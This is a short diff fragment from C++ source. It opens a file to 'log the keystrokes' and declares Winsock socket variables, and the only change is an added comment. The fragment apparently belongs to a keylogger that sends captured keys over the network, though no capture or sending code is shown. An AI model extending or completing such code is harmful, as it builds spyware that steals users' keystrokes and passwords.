@@ -22,6 +22,7 @@ int main(){
     //create a file to log the keystrokes
     ofstream keys("keys.txt", ios::trunc); // clear the keys.txt file everytime this code is run
     
+    // socket details and setup
     SOCKET client_socket;
     struct sockaddr_in serv_addr;
     WSADATA wsaData;
